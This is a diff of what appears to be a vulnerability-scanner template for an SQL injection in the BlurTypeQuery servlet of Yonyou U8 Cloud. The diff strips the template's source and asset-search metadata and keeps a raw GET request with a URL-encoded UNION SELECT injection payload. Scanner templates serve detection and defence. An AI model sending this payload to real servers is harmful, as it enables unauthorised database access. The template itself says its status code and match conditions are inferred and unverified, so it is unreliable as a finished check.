@@ -3,14 +3,8 @@ info:
   name: 用友U8CloudBlurTypeQuery存在SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/210b7ceec4e7f1c92361c423ef20eede
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 210b7ceec4e7f1c92361c423ef20eede
-    fofa: + hunter`app.name="用友 U8 Cloud"`
 http:
 - raw:
   - 'GET /servlet/~iufo/nc.itf.iufo.mobilereport.data.BlurTypeQuery?queryKey=1%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28113%29%2BISNULL%28CAST%28111%2A111%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28120%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL--%20HoaZ HTTP/1.1
